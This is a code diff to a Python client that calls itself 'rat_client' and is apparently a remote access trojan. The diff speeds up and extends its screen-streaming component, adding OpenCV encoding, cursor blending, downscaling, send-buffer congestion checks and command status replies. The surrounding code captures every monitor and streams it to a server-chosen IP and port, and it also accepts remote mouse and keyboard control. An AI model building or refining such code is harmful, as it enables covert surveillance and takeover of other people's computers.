@@ -13,6 +13,14 @@ import pathlib
 import traceback
 import base64
 import json
+import select
+try:
+    import cv2
+    import numpy as np
+except ImportError:
+    cv2 = None
+    np = None
+
 from pynput.mouse import Button, Controller as MouseController
 from pynput.keyboard import Key, Controller as KeyboardController
 
@@ -437,13 +445,14 @@ class ControlHandler(threading.Thread):
         return getattr(Key, key_str, key_str)
 
 class Streamer(threading.Thread):
-    def __init__(self, server_ip, port, fps, quality, capture_cursor, stop_event):
+    def __init__(self, server_ip, port, fps, quality, capture_cursor, scale, stop_event):
         super().__init__()
         self.server_ip = server_ip
         self.port = port
         self.fps = fps
         self.quality = quality
         self.capture_cursor = capture_cursor
+        self.scale = max(0.1, min(1.0, scale)) # Clamp scale
         self.stop_event = stop_event
         self.daemon = True
 
@@ -453,42 +462,112 @@ class Streamer(threading.Thread):
             try:
                 data_socket.connect((self.server_ip, self.port))
                 data_socket.sendall(b'rat_client') # Handshake for server bridge
+                data_socket.setblocking(True) # Ensure blocking mode for sendall, but we use select
             except Exception:
-                # Server might have closed the listener before we could connect
                 return
 
             try:
                 while not self.stop_event.is_set():
                     start_time = time.time()
                     
+                    # Congestion Control: Check if socket is ready to write
+                    # If the outgoing buffer is full, we skip this frame to prevent lag buildup.
+                    _, writable, _ = select.select([], [data_socket], [], 0)
+                    if not writable:
+                        time.sleep(0.01) # Short sleep to avoid CPU spinning
+                        continue
+
                     # sct.monitors[0] is all screens combined, [1:] are individual monitors
                     for i, monitor in enumerate(sct.monitors[1:]):
                         sct_img = sct.grab(monitor)
                         
-                        # Convert BGRA to RGB for Pillow
-                        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+                        frame_bytes = None
                         
-                        # --- Cursor Overlay Logic ---
-                        if self.capture_cursor:
-                            cursor_img, cursor_pos = capture_cursor()
-                            if cursor_img and cursor_pos:
-                                # Calculate position relative to the current monitor
-                                relative_x = cursor_pos[0] - monitor['left']
-                                relative_y = cursor_pos[1] - monitor['top']
+                        if cv2 is not None and np is not None:
+                            # --- OpenCV Path (Faster) ---
+                            img_np = np.array(sct_img) # BGRA
+                            
+                            # Overlay Cursor
+                            if self.capture_cursor:
+                                cursor_img, cursor_pos = capture_cursor()
+                                if cursor_img and cursor_pos:
+                                    try:
+                                        # Cursor is RGBA (PIL), img_np is BGRA
+                                        c_img = np.array(cursor_img)
+                                        
+                                        # Calculate positions
+                                        rel_x = cursor_pos[0] - monitor['left']
+                                        rel_y = cursor_pos[1] - monitor['top']
+                                        
+                                        # Dimensions
+                                        ch, cw = c_img.shape[:2]
+                                        h, w = img_np.shape[:2]
+                                        
+                                        # Clipping
+                                        x1, x2 = max(0, rel_x), min(w, rel_x + cw)
+                                        y1, y2 = max(0, rel_y), min(h, rel_y + ch)
+                                        
+                                        # Cursor source coordinates
+                                        cx1 = max(0, -rel_x)
+                                        cx2 = cw - max(0, (rel_x + cw) - w)
+                                        cy1 = max(0, -rel_y)
+                                        cy2 = ch - max(0, (rel_y + ch) - h)
+                                        
+                                        if y1 < y2 and x1 < x2:
+                                            # Extract regions
+                                            bg_roi = img_np[y1:y2, x1:x2, :3] # BGR
+                                            c_roi = c_img[cy1:cy2, cx1:cx2] # RGBA
+                                            
+                                            # Alpha blending
+                                            alpha = c_roi[:, :, 3] / 255.0
+                                            alpha = alpha[:, :, np.newaxis]
+                                            
+                                            # Cursor RGB need to be swapped to BGR
+                                            c_bgr = c_roi[:, :, :3][:, :, ::-1]
+                                            
+                                            blended = (1.0 - alpha) * bg_roi + alpha * c_bgr
+                                            img_np[y1:y2, x1:x2, :3] = blended.astype(np.uint8)
+                                    except Exception:
+                                        pass # Fail safe for cursor overlay
+
+                            # Drop Alpha for JPEG
+                            img_final = img_np[:, :, :3]
+                            
+                            # Resize
+                            if self.scale < 1.0:
+                                width = int(img_final.shape[1] * self.scale)
+                                height = int(img_final.shape[0] * self.scale)
+                                img_final = cv2.resize(img_final, (width, height), interpolation=cv2.INTER_LINEAR)
                                 
-                                # Paste cursor onto the screenshot, using its alpha channel as a mask
-                                img.paste(cursor_img, (relative_x, relative_y), cursor_img)
+                            # Encode
+                            result, encoded_buf = cv2.imencode('.jpg', img_final, [int(cv2.IMWRITE_JPEG_QUALITY), self.quality])
+                            if result:
+                                frame_bytes = encoded_buf.tobytes()
+                                
+                        else:
+                            # --- PIL Path (Fallback) ---
+                            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+                            
+                            if self.capture_cursor:
+                                cursor_img, cursor_pos = capture_cursor()
+                                if cursor_img and cursor_pos:
+                                    relative_x = cursor_pos[0] - monitor['left']
+                                    relative_y = cursor_pos[1] - monitor['top']
+                                    img.paste(cursor_img, (relative_x, relative_y), cursor_img)
+                            
+                            if self.scale < 1.0:
+                                w, h = img.size
+                                img = img.resize((int(w * self.scale), int(h * self.scale)), Image.BILINEAR)
+
+                            with io.BytesIO() as buffer:
+                                img.save(buffer, format="JPEG", quality=self.quality)
+                                frame_bytes = buffer.getvalue()
                         
-                        # Compress to JPEG in memory
-                        with io.BytesIO() as buffer:
-                            img.save(buffer, format="JPEG", quality=self.quality)
-                            frame_bytes = buffer.getvalue()
-                        
-                        if not send_frame(data_socket, frame_bytes, i):
-                            self.stop_event.set() # Signal loop to stop
-                            break
+                        if frame_bytes:
+                            if not send_frame(data_socket, frame_bytes, i):
+                                self.stop_event.set()
+                                break
                     
-                    # Frame rate limiting
                     elapsed_time = time.time() - start_time
                     sleep_time = (1.0 / self.fps) - elapsed_time
                     if sleep_time > 0:
@@ -802,15 +881,17 @@ def main():
                 fps = payload.get("fps", 30)
                 quality = payload.get("quality", 70)
                 capture_cursor = payload.get("capture_cursor", True)
-                
-                if stream_thread and stream_thread.is_alive():
-                    continue # Already streaming
+                scale = payload.get("scale", 0.5) # Default to scaling down by half
 
-                stop_stream_event = threading.Event()
-                stream_thread = Streamer(ip, port, fps, quality, capture_cursor, stop_stream_event)
-                stream_thread.start()
-            except Exception:
-                pass # Ignore malformed command
+                if stream_thread is None or not stream_thread.is_alive():
+                    stop_stream_event = threading.Event()
+                    stream_thread = Streamer(ip, port, fps, quality, capture_cursor, scale, stop_stream_event)
+                    stream_thread.start()
+                    send_json(sock, {"type": "watch_response", "status": "success", "message": "Streaming started"})
+                else:
+                    send_json(sock, {"type": "watch_response", "status": "error", "message": "Stream already running"})
+            except Exception as e:
+                send_json(sock, {"type": "watch_response", "status": "error", "message": str(e)})
 
         elif action == "control_start":
             try:
